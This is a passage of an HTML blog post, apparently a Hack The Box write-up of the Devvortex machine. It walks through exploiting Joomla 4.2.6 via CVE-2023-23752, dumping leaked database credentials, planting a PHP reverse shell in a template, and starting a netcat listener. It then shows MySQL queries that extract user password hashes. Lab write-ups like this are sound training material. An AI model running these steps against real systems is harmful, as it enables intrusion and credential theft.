sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-lg.png 1024w\"></figure>\n<h3>Website Recon</h3>\n<p>Its a Joomla CMS website. So, let's run Joomscan to findout if there any vulnerebility it have.</p>\n<pre class=\"language-bash line-numbers\"><code>joomscan -u http://dev.devvortex.htb/\n    ____  _____  _____  __  __  ___   ___    __    _  _ \n   (_  _)(  _  )(  _  )(  \\/  )/ __) / __)  /__\\  ( \\( )\n  .-_)(   )(_)(  )(_)(  )    ( \\__ \\( (__  /(__)\\  )  ( \n  \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_)\n\t\t\t(1337.today)\n   \n    --=[OWASP JoomScan\n    +---++---==[Version : 0.0.7\n    +---++---==[Update Date : [2018/09/23]\n    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo\n    --=[Code name : Self Challenge\n    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP\n\nProcessing http://dev.devvortex.htb/ ...\n\n\n\n[+] FireWall Detector\n[++] Firewall not detected\n\n[+] Detecting Joomla Version\n[++] Joomla 4.2.6\n\n[+] Core Joomla Vulnerability\n[++] Target Joomla core is not vulnerable\n\n[+] Checking apache info/status files\n[++] Readable info/status files are not found\n\n[+] admin finder\n[++] Admin page : http://dev.devvortex.htb/administrator/\n\n[+] Checking robots.txt existing\n[++] robots.txt is found\npath : http://dev.devvortex.htb/robots.txt \n\nInteresting path found from robots.txt\nhttp://dev.devvortex.htb/joomla/administrator/\nhttp://dev.devvortex.htb/administrator/\nhttp://dev.devvortex.htb/api/\nhttp://dev.devvortex.htb/bin/\nhttp://dev.devvortex.htb/cache/\nhttp://dev.devvortex.htb/cli/\nhttp://dev.devvortex.htb/components/\nhttp://dev.devvortex.htb/includes/\nhttp://dev.devvortex.htb/installation/\nhttp://dev.devvortex.htb/language/\nhttp://dev.devvortex.htb/layouts/\nhttp://dev.devvortex.htb/libraries/\nhttp://dev.devvortex.htb/logs/\nhttp://dev.devvortex.htb/modules/\nhttp://dev.devvortex.htb/plugins/\nhttp://dev.devvortex.htb/tmp/\n\n\n[+] Finding common backup files name\n[++] Backup files are not found\n\n[+] Finding common log files name\n[++] error log is not found\n\n[+] Checking sensitive config.php.x file\n[++] Readable config files are not found\n\n\nYour Report : reports/dev.devvortex.htb/</code></pre>\n<p id=\"ef03\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\"><strong class=\"mk gs\">Joomla v. 4.2.6</strong>. This version should be vulnerable to recent <a class=\"af oj\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23752\" rel=\"noopener ugc nofollow\" target=\"_blank\">CVE-2023–23752</a> (Data exfiltration). Surfing the web, I came across this very fine <a class=\"af oj\" href=\"https://www.exploit-db.com/exploits/51334\" rel=\"noopener ugc nofollow\" target=\"_blank\">exploit PoC</a> from <strong class=\"mk gs\">exploit-db.com</strong></p>\n<p id=\"91b4\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Let’s download and run it against the Joomla installation to exploit the webapp.</p>\n<pre class=\"language-bash line-numbers\"><code>ruby exploit.rb http://dev.devvortex.htb \nUsers\n[649] lewis (lewis) - lewis@devvortex.htb - Super Users\n[650] logan paul (logan) - logan@devvortex.htb - Registered\n\nSite info\nSite name: Development\nEditor: tinymce\nCaptcha: 0\nAccess: 1\nDebug status: false\n\nDatabase info\nDB type: mysqli\nDB host: localhost\nDB user: lewis\nDB password: P4ntherg0t1n5r3c0n##\nDB name: joomla\nDB prefix: sd4fg_\nDB encryption 0</code></pre>\n<p>Let’s try to authenticate with the credentials we just exfiltrated.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup4.png\" alt=\"Devvortex - HTB Writeup\" width=\"537\" height=\"281\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-lg.png 1024w\"></figure>\n<p>Hurrah, <strong class=\"mk gs\">we are in!</strong></p>\n<p>We saw that user <strong class=\"mk gs\">lewis </strong>is super user, we have admin rights to the content. We can change <strong class=\"mk gs\">PHP </strong>code how/where-ever we want. Our next stop is to land on the page where we can edit <strong class=\"mk gs\">PHP </strong>code and get reverse shell to our host machine. For Joomla, we can find such page inside installed templates. For this, we need to surf through <strong class=\"mk gs\">System -&gt; Templates -&gt; Administrator Templates.</strong></p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup5.png\" alt=\"Devvortex - HTB Writeup\" width=\"549\" height=\"287\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-lg.png 1024w\"></figure>\n<p>We have one templated installed. Open and observe it.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup6.png\" alt=\"Devvortex - HTB Writeup\" width=\"546\" height=\"200\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-lg.png 1024w\"></figure>\n<p>Click on 'New File' on the top and create 'rev.php' file. Then click on that file that you can find your left in the website.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\" src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup8.png\" alt=\"Devvortex - HTB Writeup\" width=\"548\" height=\"288\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-lg.png 1024w\"></figure>\n<p>Start netcat listener on the host machine <code>nc -lvnp 1337</code>, visit <a href=\"httpundefined://dev.devvortex.htb/templates/cassiopeia/rev.php&lt;code&gt;&lt;/code&gt;\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">http://dev.devvortex.htb/templates/cassiopeia/rev.php</a> and wait for the sweet shell.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup9.png\" alt=\"Devvortex - HTB Writeup\" width=\"567\" height=\"177\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxldCdzJTIwdXBncmFkZSUyMG91ciUyMHNoZWxsJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyWk9TS2pWWlo2WWN2JTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQ3Q4RmVuQnpmSEdSJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyYUlJaHlmZEhKczFEJTIyJTdE\">Let's upgrade our shell with this command.</span></p>\n<pre class=\"language-python line-numbers\"><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"</code></pre>\n<p>W<span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBzdGlsbCUyMGhhdmUlMjBsZXdpcyUyMGNyZWRlbnRpYWxzJTIwd2UlMjBmb3VuZCUyMGVhcmxpZXIlMjBtYXliZSUyMHdlJTIwY2FuJTIwc2VhcmNoJTIwdGhlJTIwZGF0YWJhc2UlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMbU54Q1F5Wmh0Q0olMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI2TENjWllPVDVnVTUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJFd3FiRjlGNTB6NnglMjIlN0Q=\">e still have lewis credentials we found earlier maybe we can search the database using the bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>mysql -u lewis -p</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup10-2.png\" alt=\"Devvortex - HTB Writeup\" width=\"566\" height=\"174\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBsaXN0JTIwdGhlJTIwZGF0YWJhc2VzJTIwYXZhaWxhYmxlJTIwdG8lMjB1cyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjkyY0dXbk5zbEdUYiUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnFmeEtxTUNOMTU0UCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnNPcFhIMnR2NU1oVSUyMiU3RA==\">Lets list the databases available to us with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>SHOW DATABASES;</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup11.png\" alt=\"Devvortex - HTB Writeup\" width=\"537\" height=\"227\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmpvb21sYSUyMGxvb2tzJTIwaW50ZXJlc3RpbmclMkMlMjBsZXQncyUyMHVzZSUyMHRoaXMlMjBkYXRhYmFzZSUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmlTaVlEWDVNM1MzWCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmk2YU13V3ZFQUpLbSUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjZFRzdJTFBBaHF1cSUyMiU3RA==\">joomla looks interesting, let's use this database with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>USE joomla;</code></pre>\n<p>Then <span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxpc3QlMjBhbGwlMjB0aGUlMjB0YWJsZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJBanVKQTVuNEtHWFIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJwZTZqb3RBUVhUTEglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJZSG9zYmxIZ1Y2U0klMjIlN0Q=\">list all the tables with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>SHOW TABLES;</code></pre>\n<p><span data-offset-key=\"HNnPSthUylKw:0\">we can see the following table </span><code class=\"r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t\" data-slate-leaf=\"true\" data-offset-key=\"HNnPSthUylKw:1\" data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMndlJTIwY2FuJTIwc2VlJTIwdGhlJTIwZm9sbG93aW5nJTIwdGFibGUlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlMkMlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMnNkNGZnX3VzZXJzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJtYXJrJTIyJTJDJTIydHlwZSUyMiUzQSUyMmNvZGUlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMks4Z3hZOEJzTFFpUCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmZheTJ6aHNyR1F1byUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnVtTzltY2ozUEwzWCUyMiU3RA==\">sd4fg_users</code> with bellow command.</p>\n<pre class=\"language-bash line-numbers\"><code>select username,password from sd4fg_users;</code></pre>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwc29tZSUyMHVzZXJuYW1lcyUyMGFuZCUyMHRoZXJlJTIwZW5jcnlwdGVkJTIwcGFzc3dvcmRzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyTFJtbDhJNlAzM0FmJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOFdnMjBoNFRVQjYwJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyRXY1WG9mY0FOYzFVJTIyJTdE\">We have some usernames and there encrypted passwords.....</span></p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup12.png\" alt=\"Devvortex - HTB Writeup\" width=\"570\" height=\"173\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-lg.png 1024w\"></figure>\n<p>Let's try to findout what type of password hash with hashid tool.</p>\n<pre class=\"language-bash line-numbers\"><code>hashid -e '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'\nAnalyzing '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'\n[+] Blowfish(OpenBSD) \n[+] Woltlab Burning Board 4.x \n[+] bcrypt</code></pre>\n<div>\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top400_n25lP bottom400_6eeBF\" data-key=\"SvkuuZRoSLZ0\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"SvkuuZRoSLZ0\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<ul>\n<li class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top0_4AOU1 bottom0_fXfxl\" data-key=\"gSWYuZDmWBPb\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2 r-6koalj r-18u37iz r-bnwqim\" data-block-content=\"gSWYuZDmWBPb\">\n<div class=\"css-175oi2r r-13awgt0\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-1mlwlqe r-eqz5dr r-1q142lx r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010\" data-key=\"t88OHsWBOXXd\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"uGnt8MruuD66\">Blowfish(OpenBSD)</span></div>\n</div>\n</div>\n</div>\n</li>\n</ul>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJsaXN0LXVub3JkZXJlZCUyMiUyQyUyMmlzVm9pZCUyMiUzQWZhbHNlJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCUyQyUyMm5vZGVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIybGlzdC1pdGVtJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkJsb3dmaXNoKE9wZW5CU0QpJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIycFpGdElTVGhRNXVWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySnpHMUhCYmQ5dExYJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyelFWNTlnTnVXZmFGJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOEl1eXd5MTlwWHg4JTIyJTdEJTJDJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJ0ZXh0JTIyJTJDJTIybGVhdmVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIybGVhZiUyMiUyQyUyMnRleHQlMjIlM0ElMjJMZXQncyUyMHVzZSUyMGhhc2hjYXQlMjBhbmQlMjBjcmFjayUyMHRoZSUyMHVzZXIlMjBsb2dhbiUyMGhhc2glMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTNjNhdTY3OEppcGslMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDUzZhQVFpdW55Y3clMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMazRNYzNyTW5kcG0lMjIlN0Q=\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz\" data-key=\"CS6aAQiunycw\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo 